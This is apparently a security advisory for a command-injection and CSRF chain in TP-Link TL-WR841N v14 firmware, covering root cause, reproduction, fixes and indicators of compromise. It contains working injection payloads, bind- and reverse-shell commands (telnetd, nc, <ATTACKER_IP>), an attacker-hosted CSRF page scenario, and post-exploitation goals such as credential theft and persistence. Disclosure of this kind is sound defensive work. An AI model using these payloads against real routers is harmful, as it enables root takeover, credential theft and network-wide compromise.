# TP-Link TL-WR841N v14 — Authenticated OS Command Injection (RCE) + CSRF Chain

---

## TL;DR

The diagnostic module (`IPPING_DIAG` / `TRACEROUTE_DIAG`) in TL-WR841N v14 firmware **`0.9.1 Build 260107` (2026-01-07)** passes the `host` field directly to a Linux `system()` call. A semicolon in the host value executes arbitrary commands as **root**.

The same firmware build ships with **CSRF protection disabled** (`INCLUDE_ENABLE_REFER=0`), so an attacker who can lure a logged-in admin to a single web page gets root on the router with **no credentials**.

| Attribute            | Value                                                                                                  |
|----------------------|--------------------------------------------------------------------------------------------------------|
| Vendor               | TP-Link Technologies                                                                                   |
| Product              | TL-WR841N Wireless N Router                                                                            |
| Hardware version     | V14                                                                                                    |
| Firmware             | `0.9.1 Build 260107 rel.51385` (2026-01-07) — likely earlier v14 builds & v8–v13 RPM UI too           |
| Architecture         | MIPS32, Linux, uClibc                                                                                  |
| CWE                  | CWE-78 — Improper Neutralization of Special Elements used in an OS Command                             |
| CVSS 3.1 (auth)      | **8.8 High** — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`                                                   |
| CVSS 3.1 (CSRF)      | **8.8 High** — `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`                                                   |
| Privilege            | Root (uid=0)                                                                                           |
| Pre-auth?            | Yes, via CSRF against a logged-in admin                                                                |

---

## Table of Contents

1. [Affected Products](#1-affected-products)
2. [Vulnerable Files and Lines (Root Cause)](#2-vulnerable-files-and-lines-root-cause)
3. [Why CSRF Also Works](#3-why-csrf-also-works)
4. [Attack Scenarios](#4-attack-scenarios)
5. [Reproduction Steps](#5-reproduction-steps)
6. [Proof-of-Concept Files](#6-proof-of-concept-files)
7. [Suggested Fixes](#7-suggested-fixes)
8. [Indicators of Compromise](#8-indicators-of-compromise)
9. [Repository Layout](#9-repository-layout)

---

## 1. Affected Products

**Confirmed vulnerable**
- TL-WR841N **Hardware Version 14**, firmware `0.9.1 Build 260107 rel.51385` (2026-01-07)

**Likely vulnerable (same `libcmm.so` patterns)**
- TL-WR841N v14 — earlier firmware builds
- TL-WR841ND v14 — same hardware platform
- Other 841-series routers sharing `libcmm.so` (v10–v14)

**Same root cause, different UI (separate injection point)**
- TL-WR841N v8–v13 with the legacy `/userRpm/` web UI — injection via the `ping_addr` GET parameter at `/userRpm/PingIframeRpm.htm`.

---

## 2. Vulnerable Files and Lines (Root Cause)

All references are to the extracted SquashFS image at `squashfs-root/` inside the firmware package.

### 2.1 The vulnerable shell-exec chain — `lib/libcmm.so`

`libcmm.so` is the closed-source MIPS32 ELF that contains the router's configuration model and the OAL (OS Abstraction Layer) helpers. The vulnerable chain spans three functions:

| Step | Symbol                     | Offset in `libcmm.so` | Role                                                                                                         |
|------|----------------------------|-----------------------|--------------------------------------------------------------------------------------------------------------|
| 1    | `rsl_setIppingDiagObj`     | `+0x6E7D8`            | Setter for the `IPPING_DIAG` model object. Stores `host` with only a non-empty check and `inet_pton()`.      |
| 2    | `rsl_ipping_start`         | `+0x6EF48`            | Reads `host` back out of the model object and calls `oal_startPing()`.                                       |
| 3    | `oal_startPing`            | `+0xAB110`            | **Vulnerable function.** Formats `host` into a 256-byte buffer with `snprintf()` and runs `system()` on it.  |

#### Disassembly summary of `oal_startPing()` @ `libcmm.so +0xAB110`

```c
// Reconstructed C — actual control flow in radare2 disassembly
int oal_startPing(const char *host, int count, int size, int timeout) {
    char cmd[256];

    snprintf(cmd, sizeof(cmd),
             "ipping -c %d -s %d -w %d %s ",     // <-- format string
             count, size, timeout, host);        // <-- host injected unsanitised

    return util_execSystem("oal_startPing", cmd);
    //                                       ^
    //                                       +-- calls system(cmd)
}
```

#### Companion sink — `oal_startTraceroute()`

Same anti-pattern, format string is:
```
traceroute -m %d -q %d -w %d %s %d &
```

### 2.2 The validation that should have been called but wasn't

`libcmm.so` already contains the right helpers — they just aren't wired into the diagnostic path:

| Symbol             | What it does                                                              | Called in ping/traceroute path? |
|--------------------|---------------------------------------------------------------------------|----------------------------------|
| `validateInHost`   | Char-set allowlist for a hostname/IP                                     | **No**                          |
| `validateExHost`   | Same, for external-network hostnames                                     | **No**                          |

The setter (`rsl_setIppingDiagObj`) performs only:

```c
if (strlen(host) == 0) return -1;          // non-empty check
if (inet_pton(AF_INET, host, &buf) ...) {  // IP vs hostname format check
    /* ... */
}
// host stored verbatim into the model object — no shell-metachar filtering.
```

Neither check rejects `;`, `&`, `|`, `` ` ``, `$()`, newlines, or any other shell metacharacter.

### 2.3 Client-side validation only (not a control)

`web/main/pingNTraceRoute.htm` and `web/js/lib.js` contain:

```javascript
function isdomain(s) {
    // rejects shell metacharacters in the browser
    return /^[A-Za-z0-9.\-]+$/.test(s);
}
```

This is **client-side only** and is bypassed completely by sending the encrypted CGI request directly (as the PoC does).

### 2.4 Build flags that make the CSRF chain possible — `web/js/oid_str.js`

```javascript
INCLUDE_LOGIN_GDPR_ENCRYPT = 1;   // AES + RSA transport encryption (obfuscation, NOT a security boundary)
INCLUDE_ENABLE_REFER       = 0;   // <-- CSRF / Referer check DISABLED
INCLUDE_IPPING_DIAG        = 1;   // ping diagnostic enabled
INCLUDE_TRACEROUTE_DIAG    = 1;   // traceroute diagnostic enabled
```

`INCLUDE_ENABLE_REFER = 0` is the multiplier here — it removes the only server-side check that would otherwise reject cross-origin POSTs.

---

## 3. Why CSRF Also Works

The `/cgi_gdpr` endpoint accepts `Content-Type: text/plain` POST bodies. Combined with the disabled Referer check:

1. A cross-origin `fetch()` from any web page with `credentials: 'include'` is a **CORS simple request** — no preflight, no Origin enforcement.
2. The admin's session cookie (`Authorization=<token>`) is attached automatically by the browser.
3. The encrypted CGI body can be constructed entirely in JavaScript (Web Crypto API for AES-128-CBC, BigInt `modpow` for RSA-512).
4. The router decrypts, validates the session — **valid, because the cookie is the admin's** — and executes.

The PoC includes a self-contained `csrf.html` generator (`exploit.py --csrf`).

---

## 4. Attack Scenarios

### Scenario A — Same-LAN attacker with no credentials
A guest on the Wi-Fi crafts an HTTP page (or hijacks an unencrypted ad slot) and waits for the admin to browse the web while logged in to the router. The page silently triggers `telnetd` on port 4444. Attacker connects → root.

### Scenario B — Remote attacker via phishing link
Attacker sends a link (`http://attacker.example/csrf.html`). Admin clicks it while logged in to the router admin UI in another tab. Router quietly opens a reverse shell to `attacker.example:4444`.

### Scenario C — Malicious advertisement
An ad served on any website the admin visits contains the CSRF payload (HTTP-only iframe). No click required beyond visiting a page that serves the ad.

### Scenario D — Authenticated insider / ISP
ISP technician or anyone with valid admin credentials gets a root shell directly via `python3 exploit.py`. Useful e.g. for backdoor implant scenarios at install time.

### Scenario E — Same-LAN MITM injection
Attacker on the same network (open Wi-Fi, hotel, café) MITMs one of the admin's plaintext HTTP requests and injects the CSRF page as a response.

### Post-RCE impact (any scenario)
- Read admin password, Wi-Fi PSK, PPPoE/VPN credentials from NVRAM/`/etc/config/`
- Modify DNS / routing / firewall → MITM all LAN traffic
- Install persistence in `/etc/init.d/` or cron — survives reboot
- Pivot to every LAN device (IoT, NAS, laptops, phones)

---

## 5. Reproduction Steps

### 5.1 Lab setup

- Target: TL-WR841N v14 with firmware `0.9.1 Build 260107`
- Default admin credentials `admin` / `admin` (or your set password)
- Attacker workstation on the same LAN (or with HTTP reachability to the router)

```bash
pip install pycryptodome requests --break-system-packages
```

### 5.2 Authenticated direct RCE — bind a root telnet shell

```bash
python3 poc/exploit.py -t 192.168.0.1 -u admin -p admin --payload telnetd
```

What it does end-to-end:

1. `GET http://192.168.0.1/` — extracts the RSA public key (`ee`, `nn`) and sequence number (`seq`) from the JS in the login page.
2. Generates a random AES-128 key+IV, computes `MD5(user+pass)`.
3. Builds the login body, AES-CBC-encrypts it, RSA-signs the metadata, POSTs `sign=…&data=…` to `/cgi_gdpr`.
4. Builds the attack body:
   ```
   2&7\r\n
   [IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,4\r\n
   host=127.0.0.1;telnetd -l /bin/sh -p 4444 &\r\n
   numberOfRepetitions=4\r\n
   dataBlockSize=64\r\n
   timeout=2\r\n
   [ACT_OP_IPPING#0,0,0,0,0,0#0,0,0,0,0,0]1,0\r\n
   ```
5. AES-encrypts + RSA-signs and POSTs to `/cgi_gdpr` with the admin session cookie.
6. Router runs:
   ```
   ipping -c 4 -s 64 -w 2 127.0.0.1;telnetd -l /bin/sh -p 4444 &
   ```

Connect:
```bash
telnet 192.168.0.1 4444
# / # id
# uid=0(root) gid=0(root)
```

### 5.3 Authenticated reverse shell

```bash
# attacker:
nc -lvnp 4444

# trigger:
python3 poc/exploit.py -t 192.168.0.1 -u admin -p admin \
    --payload revshell --lhost <ATTACKER_IP> --lport 4444
```

### 5.4 Non-destructive lab validation (recommended for vendor QA)

```bash
python3 poc/exploit.py -t 192.168.0.1 -u admin -p admin \
    --payload cmd --cmd 'id > /tmp/pwned'

# Verify via a second exploit run that reads the file back:
python3 poc/exploit.py -t 192.168.0.1 -u admin -p admin \
    --payload cmd --cmd 'cat /tmp/pwned > /tmp/result'
# or attach a serial console to the router and run: cat /tmp/pwned
# Expected contents: uid=0(root) gid=0(root)
```

### 5.5 Traceroute injection vector (same root cause, alternate sink)

```bash
python3 poc/exploit.py -t 192.168.0.1 -u admin -p admin \
    --vector traceroute --payload bind --bind-port 9999
nc 192.168.0.1 9999
```

### 5.6 Unauthenticated CSRF chain — generate the HTML payload

```bash
python3 poc/exploit.py -t 192.168.0.1 --csrf --payload telnetd -o csrf.html
python3 -m http.server 8080
```

When a logged-in admin visits `http://<attacker>:8080/csrf.html`, the page silently fires the same encrypted exploit using the admin's session cookie. The attacker never learns the password.

### 5.7 Old RPM-style firmware (v8–v13)

```bash
python3 poc/exploit.py -t 192.168.0.1 --fw rpm -u admin -p admin --payload telnetd
```

This uses the legacy injection point:
```
GET /userRpm/PingIframeRpm.htm
    ?ping_addr=127.0.0.1;telnetd -l /bin/sh -p 4444 &
    &doType=ping&isNew=new&sendNum=4&pSize=64&overTime=800&trHops=20
Cookie: Authorization=Basic <base64(user:MD5(password))>
```

---

## 6. Proof-of-Concept Files

| Path                                      | Purpose                                                                             |
|-------------------------------------------|-------------------------------------------------------------------------------------|
| `poc/exploit.py`                          | Full PoC. Dual-mode (GDPR + RPM), four payload types, CSRF HTML generator.          |
| `poc/exploit_wr841n_ipping.py`            | Standalone GDPR-only PoC, simpler / readable reference implementation.              |
| `poc/README.md`                           | Per-script options and lab-setup notes.                                             |

The PoC scripts are **defensive-research artifacts** intended for use only by:
- The TP-Link PSIRT to reproduce and verify the fix
- The original researcher for re-testing the fix once a patched build is provided

They include an explicit `--payload cmd --cmd 'id > /tmp/pwned'` mode for non-destructive verification.

---

## 7. Suggested Fixes

### Fix 1 — Sanitize input in `rsl_setIppingDiagObj()` and `rsl_setTracerouteDiagObj()` (immediate)

Before storing the value, validate against an allowlist:

```c
static int is_valid_host(const char *h) {
    for (const char *p = h; *p; p++) {
        if (!(isalnum((unsigned char)*p) || *p == '.' || *p == '-' ||
              *p == ':' /* IPv6 */)) {
            return 0;
        }
    }
    return 1;
}
```

Reject the setter call if `is_valid_host(host)` is false.

### Fix 2 — Replace `system()` with `execve()` (correct long-term fix)

In `oal_startPing()` and `oal_startTraceroute()`:

```c
char count_str[16], size_str[16], timeout_str[16];
snprintf(count_str,   sizeof(count_str),   "%d", count);
snprintf(size_str,    sizeof(size_str),    "%d", size);
snprintf(timeout_str, sizeof(timeout_str), "%d", timeout);

char *argv[] = {
    "ipping", "-c", count_str, "-s", size_str, "-w", timeout_str,
    (char *)host, NULL
};
execve("/usr/sbin/ipping", argv, envp);
```

`execve()` does not invoke a shell, so metacharacter injection is structurally impossible regardless of validation.

### Fix 3 — Re-enable CSRF protection (`INCLUDE_ENABLE_REFER=1`)

Set the build flag to `1` and rebuild. Also recommend adding a synchronizer-token-pattern CSRF token issued per session and required on all state-changing CGI endpoints. Referer-based protection alone is insufficient in some browser/privacy configurations that strip the header.

### Fix 4 — Audit other `system()` callers

`util_execSystem()` is called from many places in `libcmm.so`. A grep across the codebase for `util_execSystem`, `system(`, and `popen(` will likely surface additional sinks worth reviewing while the fix is in flight.

---

## 8. Indicators of Compromise

**Listening ports** that should not normally be open on the router:
- TCP 4444 (default telnetd from this PoC)
- Any non-standard high port (`netstat -lnp` from a root shell, or `nmap -p- <router>` from LAN)

**Filesystem persistence**
- New files in `/etc/init.d/` (executed at boot)
- New entries in cron / `/etc/crontabs/`
- New SSH `authorized_keys` if Dropbear was installed

**Configuration drift**
- DNS server changed to an unfamiliar IP
- New static routes / iptables entries
- Wi-Fi SSID or PSK changed unexpectedly
- Remote management (WAN admin) enabled when admin did not enable it

**Network telemetry**
- Outbound connections to unfamiliar IPs immediately after admin UI accesses
- POST bodies to `/cgi_gdpr` with abnormally large sizes from unexpected source IPs

---

